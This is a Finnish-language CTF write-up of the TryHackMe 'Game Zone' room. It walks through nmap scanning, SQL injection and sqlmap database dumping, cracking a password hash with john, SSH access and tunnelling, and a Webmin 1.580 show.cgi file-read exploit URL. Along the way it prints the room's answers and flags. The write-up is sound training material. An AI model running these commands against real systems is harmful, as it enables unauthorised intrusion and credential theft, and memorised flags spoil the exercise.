---
title: "Game Zone Writeup"
date: 2023-06-14
tags: [writeup, ctf, tryhackme]
description: "Haavoittuvan verkkofoorumin skannaus ja hyväksikäyttö TryHackMen Game Zone -huoneessa shellin saamiseksi ja käyttöoikeuksien korottamiseksi."
---

## Valmistelut 

Ensin meidän täytyy muodostaa yhteys TryHackMen VPN-palvelimeen. Lisätietoja tästä löydät [Access](https://tryhackme.com/access) -sivulta.

Käytän openvpn:ää palvelimeen yhdistämiseen. Tässä on komento:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Tiedustelu

`nmap`-skannauksen suorittaminen antaa seuraavat tiedot:
```shell-session
$ sudo nmap -sS -Pn -vv --top-ports 2000 -oN nmap_scan.txt TARGET_IP 

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Kun avataan portin 80 http-palvelu, meitä tervehtii seuraava sivu:
![](/assets/img/writeup_assets/game-zone/home-page.png)


> Mikä on foorumilla tarkkuuskivääriä pitelevän suuren sarjakuvahahmon nimi?
>
> Vastaus: Agent 47

Sivulla on 2 syöttölomaketta: toinen on `Site Search` ja toinen `User Login`. Voimme testata tietokantainjektion (SQL) mahdollisuutta syöttämällä joitain SQLi-merkkijonoja:
![](/assets/img/writeup_assets/game-zone/sqli-simple-login.png)

Onnistunut kirjautuminen palveluun ohjaa meidät seuraavalle sivulle:
![](/assets/img/writeup_assets/game-zone/portal-login-dash.png)

> Mihin sivuun sinut uudelleenohjataan kirjautumisen jälkeen?
>
> Vastaus: `portal.php`

Koska kohde on haavoittuva SQLi:lle, voimme nyt käyttää SQLMapia lisätiedusteluun...


Käytetään Burpsuitea ja selvitetään selaimen lähettämä pyyntö `portal.php`-sivulle mentäessä:
```http
POST /portal.php HTTP/1.1
Host: TARGET_IP
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://TARGET_IP
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://TARGET_IP/portal.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=kfd3hokcd5krmlmrofgs4q45q7
Connection: close

searchitem=asd
```

Voimme tallentaa tämän tiedostoon ja antaa sen SQLMapille käyttäjäsession todentamista varten:
```shell-session
$ sqlmap -r portal-request.txt --dbms=mysql --dump

...
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y

...

POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

...

do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y

...

do you want to crack them via a dictionary-based attack? [Y/n/q] 

...

what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1

...

do you want to use common password suffixes? (slow!) [y/N] N

...
```

Tämä antaa meille salasanahashin käyttäjälle: `agent47`.

> Mikä on hashattu salasana users-taulussa?
>
> Vastaus: `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

> Mikä oli hashattuun salasanaan liittyvä käyttäjänimi?
>
> Vastaus: `agent47`

Saamme myös tietueet taulusta nimeltä `post` tietokannasta `db`.

> Mikä toisen taulun nimi oli?
>
> Vastaus: `post`


Nyt kun `agent47`:n salasanahash on saatu, voimme käyttää `john`-työkalua sen murtamiseen ja käyttäjän salasanan selvittämiseen.
```shell-session
$ echo ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 > hash.txt

$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
...
videogamer124    (?)     
```

> Mikä on purettu salasana?
>
> Vastaus: `videogamer124`

Voimme nyt yrittää kirjautua palvelimelle käyttämällä `ssh`:ta ja tunnuksia `agent47:videogamer124`.

## Pääsyn saaminen

Kirjaudumme nyt tiedusteluvaiheesta saaduilla tunnuksilla palvelimen ssh-palveluun.
```shell-session
$ ssh agent47@TARGET_IP
...
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$
```

Nyt voimme hakea user flagin:
```shell-session
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

> Mikä on user flag?
>
> Vastaus: `649ac17b1480ac13ef1e4fa579dac95c`

Tarkistetaan käynnissä olevat socket-yhteydet kohdekoneella:
```shell-session
Netid State      Recv-Q Send-Q                                               Local Address:Port                                                              Peer Address:Port               
udp   UNCONN     0      0                                                                *:10000                                                                        *:*                  
udp   UNCONN     0      0                                                                *:68                                                                           *:*                  
tcp   LISTEN     0      80                                                       127.0.0.1:3306                                                                         *:*                  
tcp   LISTEN     0      128                                                              *:10000                                                                        *:*                  
tcp   LISTEN     0      128                                                              *:22                                                                           *:*                  
tcp   LISTEN     0      128                                                             :::80                                                                          :::*                  
tcp   LISTEN     0      128                                                             :::22                                                                          :::*
```

> Kuinka monta TCP-socketia on käynnissä?
>
> Vastaus: 5

Koska portissa 10000 pyörivä palvelu on estetty palomuurilla, voimme käyttää ssh-tunnelia tuodaksemme tämän portin esiin paikallisesti.
```shell-session
$ ssh -L 10000:localhost:10000 agent47@TARGET_IP
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Sun Nov 27 23:59:23 2022 from TARGET_IP
agent47@gamezone:~$
```

Nyt voimme avata selaimella osoitteen `localhost:10000`:
![](/assets/img/writeup_assets/game-zone/localhost-10000.png)



> Mikä on paljastuneen CMS:n nimi?
>
> Vastaus: `Webmin`

Käyttämällä tunnuksia `agent47:videogamer124` voimme kirjautua tähän palveluun:
![](/assets/img/writeup_assets/game-zone/webmin-dash.png)

> Mikä on CMS:n versio?
>
> Vastaus: `1.580`

## Käyttöoikeuksien korottaminen

`searchsploit`-työkalun avulla voimme nyt etsiä exploitteja versiolle `Webmin 1.580`
```shell-session
$ searchsploit webmin 1.58     
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Executio | unix/remote/21851.rb
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metas | linux/webapps/47330.rb
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

Voimme käyttää toisen exploit-skriptin logiikkaa. Siirtymällä osoitteeseen `localhost:10000/file/show.cgi/root/root.txt` saamme `root.txt`-tiedoston sisällön.

> Mikä on root flag?
>
> Vastaus: `a4b945830144bdd71908d12d902adeee`

## Yhteenveto

Jos tästä writeupista oli apua, harkitse minun seuraamistani [github](https://github.com/NovusEdge):ssa ja/tai tähden jättämistä repositoriolle: https://github.com/NovusEdge/thm-writeups


- Huone: [Game Zone](https://tryhackme.com/room/gamezone)
